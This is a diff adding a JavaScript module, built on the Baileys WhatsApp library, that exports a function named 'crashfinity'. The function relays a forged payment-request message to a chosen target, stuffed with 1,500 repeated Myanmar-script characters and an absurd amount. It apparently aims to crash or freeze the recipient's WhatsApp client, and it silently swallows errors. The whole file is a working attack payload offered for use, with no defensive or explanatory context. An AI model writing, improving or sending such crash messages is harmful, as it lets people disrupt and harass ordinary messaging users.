@@ -1,0 +1,54 @@
+
+ 
+const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
+const pino = require('pino');
+const crypto = require('crypto');
+
+
+async function crashfinity(SYxS7, target) {
+    try {
+        const titleText = "HAI SALAM KENAL YAKK";
+        const spamText = "ြ".repeat(1500);
+
+        const fakePaymentPayload = {
+            requestPaymentMessage: {
+                currencyCodeIso4217: "IDR",    
+                requestFrom: target,          
+                expiryTimestamp: Date.now() + 8000,  
+                amount: {
+                    value: 999999999,       
+                    offset: 100,                
+                    currencyCode: "IDR"
+                },
+
+                contextInfo: {
+                    externalAdReply: {
+                        title: titleText,
+                        body: spamText,       
+                        mimetype: "audio/mpeg",      
+                        caption: spamText,           
+                        showAdAttribution: true,      
+                        sourceUrl: "https://t.me/kashmiri1_1",
+                        thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
+                    }
+                }
+            }
+        };
+
+        await SYxS7.relayMessage(
+            target,                           
+            fakePaymentPayload,
+            {
+                participant: { jid: target }, 
+                messageId: null,        
+                userJid: target,       
+                quoted: null
+            }
+        );
+
+
+    } catch (error) {
+    }
+}
+
+module.exports = { crashfinity }
